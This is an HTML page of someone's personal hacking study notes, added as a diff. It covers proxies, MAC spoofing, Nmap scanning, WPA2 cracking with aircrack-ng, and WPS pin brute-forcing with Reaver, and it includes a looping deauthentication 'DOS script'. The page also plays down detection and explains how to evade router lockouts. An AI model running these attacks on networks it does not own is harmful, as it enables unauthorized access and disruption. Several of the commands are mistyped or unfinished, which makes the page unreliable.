@@ -1,0 +1,371 @@
+<!DOCTYPE html>
+<html>
+<body>
+
+<title>My IT Journey (Once again....)</title>
+<body style="background-color:rgb(0, 0, 0);"></body>
+<h1>My IT Journey</h1>
+
+<h3>Now I started this journey about a year ago and have a learned a lot in many things, but of course I forgot 
+    a lot of things too. Hopefully by creating this HTML code, this will not only help me, but also help you.
+</h3>
+
+<h2>Proxychains</h2>
+<p>Now, what are Proxies? Proxies are basically a range of IPs that will show using things such as a Tor Node.
+    Now, there are different types of proxies, we have Dynamic, strict, and Random.
+Dynamic chain is a very common used option, imgaine you have "ABCD" proxies if any of these were to go down
+let's say "C" then you will still have "ABD". Now, we also have strict chains. Stirct chains go in the order
+of the proxy. Let's say there is "ABCD" and "A" goes down, then it will not be able to function without "A". 
+Lastly, we have random chains. Random chains give the user a new IP every time they send a packet
+or connect somewhere.
+
+We also have protocols such as HTTP, Socks4 and Socks5. Socks5 is the most popular and it causes the LEAST amount of problems. HTTP is like the normal
+protocol (HTTPS) except there is no encryption with it. We also have Socks4 which is very similar to Socks5, except it doesnt support somethings
+(IPv6 and UDP). Hint: you can access Proxies by doing `Nano /etc/proxychains4.conf` on Kali Linux and other Linux distros.</p>
+
+<h2>VPNs</h2>
+<p>Now, what are VPNs and why do we always hear about them? VPNs stand for Virtual Private Network.
+    This allows users to use a different connection when you go on the net. For example, there are multiple
+    VPNs such as VPNs in Germnay, Netherlands, Russia, US, etc. A reason people would want this is so their ISP
+    (Internet Service Provider) won't spy on them, but understand that even with a VPN you're not very 
+    anonomized. Websites can easily route back to your main IP even with a VPN.
+</p>
+
+<h2>MAC addresses</h2>
+<p>Now, what is a MAC address? This is something all computer have because it's your network interface
+    or network card, these have a MAC address built into it. This is used to identify you in a LAN network.
+    there are also tools such as "Macchanger" which change your MAC address on your computer meaning when you
+    search the net you will be accompanied with a different MAC address. Having a Macchanger will also help you
+    by disguising you as something such as a router, so when people go to check the traffic they will think it's a 
+    router of theirs. 
+</p>
+
+<h3>How to change your MAC Address</h3>
+<p>(I will be conducting this example on a Linux distro (Kali Linux)).
+ go into your terminal and use the tool "crontab" (built into Kali Linux) and go all the way to the bottom of
+ the read me file. After which, you press "I" to go into insert mode, once there you write this 
+ "@reboot macchanger -r eth0
+ <p>(next line) :wq"  (w makes it write and q makes it quit after it has runned)</p>
+</p>
+
+<h2>Scanning with Nmap</h2>
+<p>The <a> href="http://scanme.nmap.org">Nmap </a> site allows users to scan their test machine which is what we will be using as an example.
+we will be doing this in the terminal and there are some commands you should know. Nmap allows a lot of things such as Firewall scanning, OS detection, Random command, etc.
+"-A" allows OS, Version, script and traceroute scanning, "-vv" this stands for double verbouse which gives more information on the scan. We also have "-iL" which puts the IPs
+in a file. Another useful tool we will be using is called nslookup which allows you to see the IP of a domain (such as scanme.nmap.org). (Note: all DNS traffic runs on port 53)
+All you have to do is `nslookup (domain name/IP)`
+</p>
+
+<h3>Scanning Time!</h3>
+<p>We will be using scanme.nmap.org to conduct our example scans. (Note: ctrl+c and ctrl+v don't work on the terminal, you must do it manually).
+    write this `nmap scanme.nmap.org -vv (without the "-vv" we wouldn't get any info on the scan). </p>
+
+    <p>Now we will also scan our local host, your will likely be similar to mine. in the terminal type in `ifconfig` and you will see something called "eth0"
+        which is what we will be using aswell. Now in your terminal write `nmap -oG - 192.168.1.0-255 -vv > /home/SCAN  (the -255 is the range of IPs and ">" will put it in a file).
+        Another thing to note is that if you are doing this over the internet then it's a VERY good idea to pass a port range and not let it scan all 1000.
+        (Get back and finish this)
+    </p>
+
+    <h3>External Tools with Nmap</h3>
+    <p>In our terminal we will be using the scanme.nmap.org IP address to find more infos
+        specifically linking IPs with cities. Now in the Terminal type this 
+        `curl ipinfo.io/74.207.244.221`
+        this will show you more information on these IP addresses. There is also another thing I want you to check out in Nmap
+        and that is it's scripts. These scripts allow a user to a multitude of things such as DOS, Firewall-Bypass, vulnerabilities, etc.
+        Another website to check out is know as Exploit Database created by Offensive Security. This shows a ton of vulnerabilities on many things
+        such as router, webcams, etc. I STONGLY advice you to try and find your own router and see what vulnerabilities are on it.
+    </p>
+
+    <h2>WiFi Cracking</h2>
+    <p>Now due to a VM not having a network interface you must use your base OS. I'll set some links of how to
+        install it on different OS, but I will be using my other computer that runs Kali Linux
+        if you have another computer that is running Linux as a base OS that's fine, you just have to use
+        your package manager to install the tools (will explain in a follow up article).
+    </p>
+
+    <h3>Practice time!</h3>
+    <p>The first thing we will be doing is setting our network wireless card to "Monitor Mode" 
+        Type on your terminal "ifconfig wlan0 down" (Note: everyone's network wireless card name might be different
+        mine is called "Wlan0, but yours could be different"). After that type "iwconfig wlan0 mode montior"
+        and finally type "ifconfig wlan0 up".
+        We will first be using the tool "Aircrack-ng". In your terminal type "airmon-ng check wlan0". This will 
+        check any proccesses that may cause trouble, and so what we want to do is kill them. Depending on what you have to kill
+        type "kill [PID number]". After this we will check the active networks, so type "airodump-ng wlan0" (or whatever yours is named)
+        and press enter. Now after a mintue or so you can do ctrl+C to stop it, and you will be using your own network interface
+        to test these attacks. Mind you that being able to see other people's BSSID and ESSID and ENC is NOT illegal, this is public information
+        and is similar to just opening up network manager.
+        Now we will use airodump-ng again on our network interface, type on the terminal "airodump-ng -c [channel number]
+        -w SCAN_test --bssid [BSSID] [interface name]". You can find the BSSID and channel number on the info we just collected.
+        (continue with next step episode 31 and 32 full video).
+
+        (episode 32). Now when cracking our WiFi we will be using Aircrack-ng and we will be specifying a word list.
+        Now, you can find word lists all over the net, the most useful of which are in the English language
+        other languages may have word lists, but not many. No in the terminal write `Aircrack-ng -w - [file name] -e Suri 1-4`
+        "-w" is a command to read a word list, now since we're not using a word list we will be using a file.
+        We will also be using the tool crunch which will help the password cracking proccess a lot. The crunch command
+        allows someone to guess a password using a set of characters they have collected. (I reccomend reading the man page for this tool).
+
+    </p>
+    <h3>Cracking WiFi WPA2</h3>
+    <p>(David Bombal crunch video) Now in order for our machine to guess the password we must create a word list. Now you can search on Kali something called "Wordlists"
+        this will send you to a directory where you can examine some pre-built word lists. These word lists have been used in real devices so I reccomend researching them.
+        Now in your terminal type `crunch -h` this will shows the help page for crunch and inform you how to use it.
+        Now in order to do this we must use a wordlist and that word list will be rockyou.txt found in /usr/share/wordlists/rockyou.txt
+        Note this is a zipped file and to unzip it just use the command `sudo gzip -d rockyou.txt.gz`
+        Now we will preform this attack using Aircrack-ng so type in the terminal `sudo Aircrack-ng [file name].cap -w /usr/shar/wordlists/rockyou.txt
+        (add on to this how we get the scans on a file)
+        </p>
+
+        <h2>Brute-Forcing WPS pins with Reaver</h2>
+        <p>go back and watch all 3 parts again (remember to add sudo!!!)</p> 
+        <p>Now, when we're brute forcing with Aircrack-ng you need some sort of information in order to do the attack.
+            Why you may ask, well there are too many combinations to deal with and having little to no information will likely result in a faliure.
+            Even with the help of wordlist such as rockyou, you won't be able to crack it unless their password is in the wordlist.
+            Now, the great thing about Brute-Forcing with reaver is that it's for pin authentification on routers. What is pin authentification?
+            These are passwords that are just numbers (for example, "12345678" would be a pin). And the great thing about this is that the brilliant
+            manufactures made this feature enabled by default, and most likely people will not change this. Now, fortuanly there are pin locks
+            meaning if you do too many incorrect pins, it will locks for a certain time period.
+        </p>
+        <h3>Basics of Reaver and setting it up</h3>
+        <p>Now if you type 'reaver --help' you will get a ton of commands. These commands will be used for different routers as all are not the scan
+            and to not be caught, but it's highly unlikely that you will be caught. Maybe your MAC address will show but why would you care? You can just quickly change it.
+            Now, similar to Aircrack-ng we must set out network card to monitor mode. just type in 'sudo airmon-ng start wlan0'
+            this will turn your network card into monitor mode, and to check if it is just type 'iwconfig' and it should show as mode monitor.
+            (Note: when in monitor mode, your wireless access card will be named to wlan0mon). After this make sure to kill any proccesses that could disturb the attack
+            just type in 'sudo airmon-ng check kill'. Now we will start with the first command which is 'sudo wash -i wlan0mon' (Note: if it doesn't work try doing 'mkdir /etc/reaver/')
+            Now when doing this command, you will see it's very similar to the command 'sudo airodump-ng wlan0mon' but the most important part is the section named "Lck"
+            Now if your wireless access point says 'no' then great! You can do your Brute-Forcing, if it says 'yes' then that means it will NOT work. (you can configue it for these testing purposes).
+            also try to make sure your PWR is at a good range (50-60) anything lower is better
+
+        </p>
+        <h3>Reaver</h3>
+        <p>now copy your BSSID and we will be doing the command, so type 'sudo reaver -b [BSSID] -i wlan0mon -vv' and press enter.
+            this should start the proccess (not: to make this easier try putting in the channel number). 'sudo reaver -b [BSSID] -i wlan0mon -c [number] -vv'
+            Now this will try numerous pins and depending on the router and locking systems it could take about a day to crack it.
+            However, due to locking systems this could take imensly longer due to this problem, and if so we can adjust the reaver command.
+            so now type 'sudo reaver -b [BSSID] -i wlan0mon -c [number] -vv -r 2:60' the "2:60" means there will be 2 scans every 60 seconds, and yes this will take much longer maybe about 3 weeks.
+            However, this will prevent the locking system. And this is different for all routers so if that is the case then either decrease the scans or increase the time.
+        </p>
+
+        <h2>signal jamming and DOS</h2>
+        <p></p>
+
+        <h3>DOS script</h3>
+        <p>#!/bin/bash</p>
+
+           <p> while true</p>
+           <p> do</p>
+                <p>aireplay-ng -0 5 -a [BSSID] wlan0mon</p>
+                <p>ifconfig wlan0mon down</p>
+                <p>macchanger -r wlan0mon | grep "New MAC"</p>
+
+                <p>iwconfig wlan0mon mode monitor</p>
+                <p>ifconfig wlan0mon up</p>
+            <p> iwconfig wlan0mon | grep Mode</p>
+
+                <p>sleep 3</p>
+                <p>echo waiting!!!!</p>
+
+            <p>done</p>
+
+            <h2>SSL stripping and ARP spoofing</h2>
+            <p></p>
+
+
+            <style>body {
+                background-image: url('https://www.backtrack-linux.org/images/background.png');
+                background-repeat: no-repeat;
+                background-attachment: fixed;  
+                background-size: cover;
+                font-family: sans-serif;
+              }
+            p {
+                max-width: 780px;
+                margin: auto;
+                text-align: justify;
+            }
+            h1,
+            h2,
+            h3,
+            h4,
+            h5 {
+                text-align: center;
+                margin-right: auto;
+                margin-left: auto;
+                margin-bottom: 2vh;
+                margin-top: 2vh;
+            }
+            h4 {
+                margin-top: 1vh;
+                margin-bottom: 0;
+                margin-right: auto;
+                margin-left: 1vw;
+            }
+            :target a {
+                color: #959800;
+            }
+            a {
+                color: #006b9f;
+            }
+            a:hover {
+                color: #094561;
+            }
+            .img-link a:hover {
+                border: none;
+            }
+            img {
+                display: block;
+                margin-left: auto;
+                margin-right: auto;
+                margin-bottom: 2vh;
+                margin-top: 1vh;
+                width: 155px;
+            }
+            .icon {
+                width: 88px;
+            }
+            .screenshot {
+                width: 780px;
+            }
+            hr {
+                border: 1px solid #1a1a1a;
+            }
+            ul {
+                max-width: 780px;
+                margin-left: auto;
+                margin-right: auto;
+            }
+            table,
+            th,
+            td {
+                text-align: center;
+                border: 1px solid white;
+                margin-left: auto;
+                margin-right: auto;
+                max-width: 780px;
+            }
+            td {
+                padding-right: 10px;
+                padding-left: 10px;
+            }
+            code {
+                text-align: left;
+                display: inline-block;
+                font-family: Monospace;
+                background: black;
+                color: #890000;
+                border: 1px solid #890000;
+                margin: 2px;
+                padding-left: 5px;
+                padding-right: 5px;
+            }
+            ol {
+                max-width: 780px;
+                margin-left: auto;
+                margin-right: auto;
+            }
+            li {
+                max-width: 800px;
+                margin-right: auto;
+            }
+            xmp {
+                max-width: 800px;
+                margin-left: 20%;
+                margin-right: auto;
+            }
+            .big-code {
+                display: block;
+                margin-left: auto;
+                margin-right: auto;
+                margin-top: 10px;
+                margin-bottom: 10px;
+                max-width: 500px;
+            }
+            .nav {
+                margin-top: 0.5vh;
+                margin-left: 0.6vw;
+                margin-right: 0.6vw;
+            }
+            .wide-nav {
+                text-align: center;
+            }
+            .wide-nav a {
+                margin-left: 3.5%;
+                margin-right: 3.5%;
+            }
+            .nav a {
+                text-decoration: none;
+            }
+            .lime {
+                color: #00ff00;
+            }
+            .green {
+                color: #00981b;
+            }
+            .yellowgreen {
+                color: #c8e63c;
+            }
+            .white {
+                color: white;
+            }
+            .orange {
+                color: #ff6100;
+            }
+            .red {
+                color: #ff0000;
+            }
+            .lime {
+                color: lime;
+            }
+            .yellow {
+                color: yellow;
+            }
+            .case {
+                border: 2px solid #1a1a1a;
+                border-radius: 15px;
+                margin-left: 3vw;
+                margin-right: 3vw;
+                margin-bottom: 3vh;
+                margin-top: 3vh;
+            }
+            .right {
+                float: right;
+            }
+            .main {
+                min-height: 60vh;
+            }
+            .sources,
+            .futher {
+                text-align: left;
+            }
+            .footer,
+            .center {
+                margin-top: 1vh;
+                text-align: center;
+            }
+            .directory-list {
+                border: 2px solid #814c3a;
+                margin-left: 5%;
+                margin-right: 5%;
+                margin-top: 10px;
+                margin-bottom: 10px;
+            }
+            .directory-list h2 {
+                text-align: left;
+                padding-top: 10px;
+                margin-left: 5%;
+                margin-right: 5%;
+            }
+            .directory-list ul {
+                margin-left: 5%;
+                margin-right: 5%;
+            }
+            .directory-list li {
+                padding: 1%;
+                text-align: left;
+
+            
+            }</style>
+
+</body>
+</html>
